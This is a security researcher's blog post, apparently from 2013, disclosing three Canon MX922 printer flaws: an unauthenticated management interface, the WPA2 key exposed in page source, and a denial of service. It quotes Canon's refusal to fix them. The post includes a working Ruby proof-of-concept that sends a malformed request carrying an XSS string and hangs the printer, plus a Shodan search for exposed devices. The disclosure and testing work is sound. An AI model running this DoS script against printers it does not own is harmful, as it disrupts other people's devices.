<!DOCTYPE html>
<html lang="en-US">
	<head>
		<meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
		<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
		<meta content='MattAndreko.com' name='description'/>
		<meta content='matt,andreko,mandreko,hostess,h0stess,hacking,exploitation,wargames' name='keywords'/>
		
		<meta content='@mandreko' name='twitter:site'/>
		<meta content='@mandreko' name='twitter:creator'/>
		
		<link href='https://www.mattandreko.com/favicon.ico' rel='icon' type='image/x-icon'/>
		<link href='https://www.mattandreko.com/' rel='canonical'/>
		<title>Canon, Y U NO Security?</title>

		<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous" defer async></script>
		<script src="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/js/fontawesome.min.js" integrity="sha256-p1rugc6vQ3W1M+J8xcHsQA07SkKvpGJlz4Uo+mxPP7Q=" crossorigin="anonymous" defer async></script>
		<script src="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/js/brands.min.js" integrity="sha256-oAJXCqY95Tu+gAhKEFrSyNb8MZw8QLH7M7DZnPvySmk=" crossorigin="anonymous" defer async></script>
		<script src="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/js/solid.min.js" integrity="sha256-VBkx1KuWMQsCMY3ShxVk5WyYNVcQYKNUpjF13YWP5ZE=" crossorigin="anonymous" defer async></script>
		
		<script async src="//www.googletagmanager.com/gtag/js?id=UA-25280110-1"></script>
		<script>
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-25280110-1');
		</script>
		

		
		<script type="text/javascript">
			function writeCSS(url) {
				var stylesheet = document.createElement('link');
				stylesheet.href = url;
				stylesheet.rel = 'stylesheet';
				stylesheet.type = 'text/css';
				document.getElementsByTagName('head')[0].appendChild(stylesheet);
			}
			
			writeCSS('//fonts.googleapis.com/css?family=Raleway:400,700%7COpen+Sans:400,700,400italic');
			writeCSS('//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/css/fontawesome.min.css');
			writeCSS('/css/main.css');
	  	</script>

		
		<script>
			
			if(typeof jQuery!=='undefined'){
				document.write('<script src="/js/jquery.min.js"><\/script>');
			}
			
			if(typeof FontAwesome!=='undefined'){
				document.write('<script src="/js/fontawesome.min.js"><\/script>');
				document.write('<script src="/js/brands.min.js"><\/script>');
				document.write('<script src="/js/solid.min.js"><\/script>');
				document.write('<link rel="stylesheet" href="/css/fontawesome.min.css">');
			}
		</script>
	</head>
	<body class='index'>
	
	<div class='head-wrap'>
		<div class='row' id='header-wrappers'>
			<div class='headerleft'>
				<div class='headerleft section' id='headerleft'>
					<div class='widget Header' data-version='1' id='Header1'>
						<div id='header-inner'>
							<a href='/' style='display: block'><h1 style='display:none'></h1>
								<img alt="Logo" height="55px; " id="Header1_headerimg" src="/img/logo.png" style="display: block" width="311px; ">
							</a>
						</div>
					</div>
				</div>
			</div>
			<div style='clear: both;'></div>
		</div>
	</div>
	<div class='navi-menu'>
		<div class='nav-menu section' id='Navigation Menu' name='Navigation Menu'>
			<div class='widget LinkList' data-version='1' id='LinkList100'>
				<div class='widget-content'>
					<ul id='nav' itemscope='' itemtype='http://schema.org/SiteNavigationElement'>
						
							<li itemprop='name'><a href='/' itemprop='url'>HOME</a></li>
						
							<li itemprop='name'><a href='/categories' itemprop='url'>CATEGORIES</a></li>
						
							<li itemprop='name'><a href='/resume.pdf' itemprop='url'>RESUME</a></li>
						
					</ul>
					<select class="selectnav" id="selectnav2">
						<option value="">Menu</option>
						
						<option value='/'>HOME</option>
						
						<option value='/categories'>CATEGORIES</option>
						
						<option value='/resume.pdf'>RESUME</option>
						
					</select>
				</div>
			</div>
		</div>
		<div class='top-bar-social blue section' id='header social widget' name='Top Social Widget'>
			<div class='widget LinkList' data-version='1' id='LinkList230'>
				<div class='widget-content'>
					<ul id='social'>
						
							<li><a class='facebook' href='https://www.facebook.com/mattandreko' title='facebook'><i class="fab fa-facebook"></i></a></li>
						
						
							<li><a class='twitter' href='https://www.twitter.com/mandreko' title='twitter'><i class="fab fa-twitter"></i></a></li>
						
						
							<li><a class='linkedin' href='https://www.linkedin.com/mattandreko' title='linkedin'><i class="fab fa-linkedin"></i></a></li>
						
						
							<li><a class='stack-overflow' href='http://stackoverflow.com/story/mattandreko' title='stack-overflow'><i class="fab fa-stack-overflow"></i></a></li>
						
						
							<li><a class='github' href='https://www.github.com/mandreko' title='github'><i class="fab fa-github"></i></a></li>
						
						
							<li><a class='instagram' href='https://www.instagram.com/mandreko' title='instagram'><i class="fab fa-instagram"></i></a></li>
						
					</ul>
				</div>
			</div>
		</div>
		<div style='clear: both;'></div>
	</div>
	
	<div style='clear: both;'></div>
	<div id="outer-wrapper" class="index home">


<div class='row' id='content-wrapper'>
    <div id='main-wrapper'>
      <div class='main section' id='main'>
      


        <div id="main">
          <div id="content">
            <div>
              <article class="hentry" role="article">

                
                

                <div class="entry-content">
                  
                  
                  

<p>I recently bought a new printer at home, so my wife could print coupons without manually attaching to my office printer each time (Thanks coupons.com and all the other shady sites that require spyware-like software to print coupons, and often don&rsquo;t support network printers). I ended up picking up a <a href="https://www.amazon.com/dp/B00AVWKUJS/ref=as_li_ss_til?tag=mattandcom-20&amp;camp=0&amp;creative=0&amp;linkCode=as4&amp;creativeASIN=B00AVWKUJS&amp;adid=07S04SQ3X3C73H5QDS7T&amp;">Canon MX922</a>. It works awesome for her, and is connected over WiFi, so any device in the house can print to it. This got me thinking though, about how secure it was.</p>

<!-- more -->

<h2 id="no-credentials-for-management-interface">No Credentials For Management Interface</h2>

<h3 id="cve-2013-4613">CVE-2013-4613</h3>

<p>I found the IP of the status page of my router, and browsed to it. I was greeted with this management page.</p>

<figure class="img-responsive">
    <img src="/img/printer_1.png"/> 
</figure>


<p>I then figured I&rsquo;d look at some of the more advanced settings, so I clicked the &ldquo;Advanced&rdquo; link. This brought me to a control panel for the printer. I saw a bunch of information, and was surprised that I had not entered <b>any</b> credentials. I figured maybe the status page would be anonymous, but surely I&rsquo;d need some password to access the management pages. But then again, I hadn&rsquo;t used any password when setting up the printer using the LCD.</p>

<h2 id="disclosure-of-wireless-key-and-ssid">Disclosure of Wireless Key and SSID</h2>

<h3 id="cve-2013-4614">CVE-2013-4614</h3>

<p>I eventually browsed to the &ldquo;Network Settings&rdquo; tab, and saw my SSID of &ldquo;Wireless&rdquo;. Not too bad, since it&rsquo;s broadcast in the air.</p>

<figure class="img-responsive">
    <img src="/img/printer_2.png"/> 
</figure>


<p>I saw that it was using WPA2, as I configured. I clicked the &ldquo;Modify&rdquo; button, and saw that I could change all of the wireless settings. The worst was that when I saw the &ldquo;Use WPA2&rdquo; radio button, I saw that there was text in the password box.</p>

<figure class="img-responsive">
    <img src="/img/printer_3.png"/> 
</figure>


<p>Assuming that there was a junk value in there, I viewed the source. Unfortunately, what I found was that the page did indeed have my printer&rsquo;s WPA2 password right there.</p>

<figure class="img-responsive">
    <img src="/img/printer_4.png"/> 
</figure>


<p>I started thinking about this. It wasn&rsquo;t a <i>huge</i> issue, since you&rsquo;d have to already know my WPA2 key to get to the printer, right? Oh, but what about if a device behind my firewall had been compromised by a remote attacker? The attacker would be free to navigate to my printer, and grab my password. If I was like just about every other person I talk to, I probably use the same password on everything, so I don&rsquo;t have to remember unique passwords. That means now an attacker could potentially login to my email, my SSH server, or even other machines on my LAN. This scared me slightly.</p>

<p>After a while, I started thinking that perhaps there were people that could potentially put their printers directly connected to the internet, and have these management interfaces publicly exposed to anonymous clients. I checked out the <a href="http://www.shodanhq.com/search?q=port%3A80+KS_HTTP+1.0">ShodanHQ</a> (FYI, it seems also Minolta uses this server banner as well). I saw that there were nearly 15,000 at the time of this writing, so I wrote up a quick Metasploit module to enumerate the information. It is located <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/canon_wireless.rb">here</a>. Below is sample output from a selection of hosts I got from ShodanHQ and a host that should time out, as a control sample.</p>

<figure class="img-responsive">
    <img src="/img/printer_5.png"/> 
</figure>


<h2 id="denial-of-service">Denial of Service</h2>

<h3 id="cve-2013-4615">CVE-2013-4615</h3>

<p>I kept playing around with the configuration interface, and while tinkering with some inputs in <a href="http://portswigger.net/burp/">Burp</a>, the device stopped responding. I walked to the other room, where we keep the printer, and noticed that it was completely unresponsive. I had to power-cycle the device, to which it came back up and told me it wasn&rsquo;t powered down properly.</p>

<p>When I reported this to Canon, they asked me for more information, so I provided them the following code as a proof-of-concept.</p>

<pre><code>#!/usr/bin/ruby

require 'net/http'
require 'uri'

print 'Enter your printer IP Address: '
input = gets.strip

printer_url = &quot;http://#{input}&quot;

# Make the first request, to set the IP to invalid data
post = Net::HTTP.post_form(URI.parse(printer_url + '/English/pages_MacUS/cgi_lan.cgi'),
{'OK.x' =&gt; '61', 'OK.y' =&gt; '12', 'LAN_OPT1' =&gt; '2', 'LAN_TXT1' =&gt; 'Wireless', 'LAN_OPT3' =&gt; '1', 'LAN_TXT21' =&gt; '192', 
'LAN_TXT22' =&gt; '168', 'LAN_TXT23' =&gt; '1', 'LAN_TXT24' =&gt; '114&quot;&gt;&lt;script&gt;alert(\'xss\');&lt;/script&gt;', 'LAN_TXT31' =&gt; '255',
'LAN_TXT32' =&gt; '255', 'LAN_TXT33' =&gt; '255', 'LAN_TXT34' =&gt; '0', 'LAN_TXT41' =&gt; '192', 'LAN_TXT42' =&gt; '168', 
'LAN_TXT43' =&gt; '1', 'LAN_TXT44' =&gt; '1', 'LAN_OPT2' =&gt; '4', 'LAN_OPT4' =&gt; '1', 'LAN_HID1' =&gt; '1'})

# Make the second request, to trigger the DoS
begin
get = Net::HTTP.get(URI.parse(printer_url + '/English/pages_MacUS/lan_set_content.html'))
rescue Timeout::Error
puts 'Look at your printer to see it is unresponsive.'
end
</code></pre>

<p>If you look closely, you can see that I was testing for Cross-Site-Scripting, and put HTML in the &ldquo;LAN_TXT24&rdquo; input box. Canon&rsquo;s javascript validation prevents this, but nothing stops you from manipulating the HTTP response. This is a prime example of why server-side validation is also required.</p>

<p>I ended up turning this into a Metasploit module as well. You can find it available <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/http/canon_wireless_printer.rb">here</a>. It works pretty similarly to most DoS modules:</p>

<figure class="img-responsive">
    <img src="/img/printer_6.png"/> 
</figure>


<h2 id="canon-s-response">Canon&rsquo;s Response</h2>

<p>I responsibly disclosed these vulnerabilities to Canon, but they apparently don&rsquo;t deem them worthy of being fixed. I don&rsquo;t think they really &ldquo;get it&rdquo;. Since they aren&rsquo;t going to fix it, I am releasing these details publicly. Below is their reply:</p>

<blockquote>
<p>Dear Mr. Andreko,</p>

<p>Thank you for your patience in allowing Canon to respond.  We have confirmed that the two issues you described in your May 27th e-mail can occur in certain printers such as the MX922.  However, with respect to the issue of no password by default, please note that the inkjet printers which have network functionality such as the MX922 are designed for home use which is supposed to be secured.  For this reason, and for user convenience, the default setting does not require a password.  However, if a user has a particular concern about third parties accessing the userâ€™s home printer, the default setting can be changed to add a password.</p>

<p>Similarly, regarding the DoS issue, Canon believes that its printers will not have to deal with unauthorized access to the network from an external location as long as the printers are used in a secured environment.  The issue you described could only occur when unauthorized access to an unsecured network takes place from the outside.  Canon has long advised customers to ensure that their computers and printers are secured when used in a wireless LAN environment.  We will continue advising customers to use our inkjet printers in a secured network environment with a firewall.  However, even if the printer were not used in a secure environment, in the unlikely chance that this type of access occurred from outside, the printer would simply have to be unplugged and re-plugged to ensure normal operation.  In addition, if the network security settings on the printer had been changed by the external source as a result of the incident, then they would have to be changed back to the default settings along with unplugging and re-plugging the power cord to ensure normal operation.</p>

<p>Again, we thank you for giving Canon the opportunity to investigate these issues and to respond to your concerns.</p>

<p>Best regards,
Joy
Executive Response Representative
Canon Customer Relations
customer@cits.canon.com
866-886-1901, x 2130</p>
</blockquote>

<p>I understand, these vulnerabilites aren&rsquo;t super high priority. They&rsquo;re no ms08-067. But I would still think a vendor would want to fix them. When searching ShodanHQ, I found a bunch of printers from UCLA. I can only imagine the chaos when it becomes finals-week, and all the printers on campus stop working randomly. That&rsquo;d be bad PR for Canon. Who knows what else is out there. I&rsquo;d personally be interested in dumping the firmware of the printer, and seeing if there&rsquo;s a way to get remote code execution out of a crash. I&rsquo;ll chalk that up to my TODO list.</p>

                </div>
                
              </article>
            </div>
          </div>
        </div>


      
      </div>
    </div>
    
    <div id='sidebar-wrapper'>
      <div class='sidebar ready-widget section' id='sidebar'>
        <div class='widget HTML' data-version='1' id='HTML3'>
	<h2 class='title'>Author</h2>
	<div class='widget-content'>
		<div class="sidebar_about_author">
			<div class="inner_wrapper">
				<div class="aboutme-img">
					<img alt="Author" class="img-responsive" height="388px" src="https://www.mattandreko.com/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
				</div>
			</div>
			<div class="aboutme-info">
				<h4>Matt Andreko</h4>
				<p>Security Consultant</p>
			</div>
		</div>
	</div>
	<div class='clear'></div>
</div>
        <div class='RecentPosts' data-version='1' id='RecentPosts1'>
	<h2>Recent Posts</h2>
	<div class='widget-content recent-posts'>
		<ul>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2014/12/17/compiling-sslscan-with-sslv2-support-on-osx/'>
							<img alt='Compiling SSLScan with SSLv2 support on OSX' border='0' height='72' src='https://www.mattandreko.com/img/sslscan_apple.png' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2014/12/17/compiling-sslscan-with-sslv2-support-on-osx/'>Compiling SSLScan with SSLv2 support on OSX</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2014/08/01/burp-icon-in-osx/'>
							<img alt='Burp Icon in OSX' border='0' height='72' src='https://www.mattandreko.com/img/automator_burp.png' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2014/08/01/burp-icon-in-osx/'>Burp Icon in OSX</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2014/01/13/backdoor-modules-for-netgear-linksys-and-other-routers/'>
							<img alt='Backdoor Modules for Netgear, Linksys, and Other Routers' border='0' height='72' src='https://www.mattandreko.com/img/backdoor_all_the_routers.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2014/01/13/backdoor-modules-for-netgear-linksys-and-other-routers/'>Backdoor Modules for Netgear, Linksys, and Other Routers</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2013/11/20/brainpan2/'>
							<img alt='Brainpan2' border='0' height='72' src='https://www.mattandreko.com/img/brainpan.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2013/11/20/brainpan2/'>Brainpan2</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
			<li>
				<div class='item-thumbnail-only'>
					<div class='item-thumbnail'>
						<a href='https://www.mattandreko.com/2013/06/18/canon-y-u-no-security/'>
							<img alt='Canon, Y U NO Security?' border='0' height='72' src='https://www.mattandreko.com/img/y-u-no-guy.jpg' width='72'/>
						</a>
					</div>
					<div class='item-title'><a href='https://www.mattandreko.com/2013/06/18/canon-y-u-no-security/'>Canon, Y U NO Security?</a></div>
				</div>
				<div style='clear: both;'></div>
			</li>
			
		</ul>
		<div class='clear'></div>
	</div>
</div>

        <div class='widget Label' data-version='1' id='Label1'>
	<h2>Top Categories</h2>
	<div class='widget-content cloud-label-widget-content'>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/hacking'>hacking</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/wargames'>wargames</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/linux'>linux</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/protostar'>protostar</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/natas'>natas</a>
			</span>
		
			<span class='label-size label-size-5'>
				<a dir='ltr' href='/tags/nebula'>nebula</a>
			</span>
		
		<div class='clear'></div>
	</div>
</div>
      </div>
    </div>
    <div style='clear: both;'></div>
  </div>





		</div>
		
		<div id='w2t_footer'>
			<div class='w2t-copy-container row'>
				<div class='w2t_footer_copyright'>
					Copyright &copy; 2019 Matt Andreko. All Rights Reserved
				</div>
			</div>
		</div>
		
		
			
				<script type="text/javascript">
	var disqus_shortname = 'mattandreko';
	var disqus_script = 'count.js';

	(function () {
		var dsq = document.createElement('script'); 
		dsq.type = 'text/javascript'; 
		dsq.async = true;
		dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	}());
</script>
			
		
		
	</body>
</html>
<noscript>
	<link href="//fonts.googleapis.com/css?family=Raleway:400,700%7COpen+Sans:400,700,400italic" media="all" rel="stylesheet" type="text/css">
	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/css/fontawesome.min.css" integrity="sha256-2YN65RPLgK7PP1NpH0YKIgYwPo7o/96HqVXBH7lQ3MU=" crossorigin="anonymous" />
	<link type="text/css" rel="stylesheet" href="/css/main.css" />
</noscript>
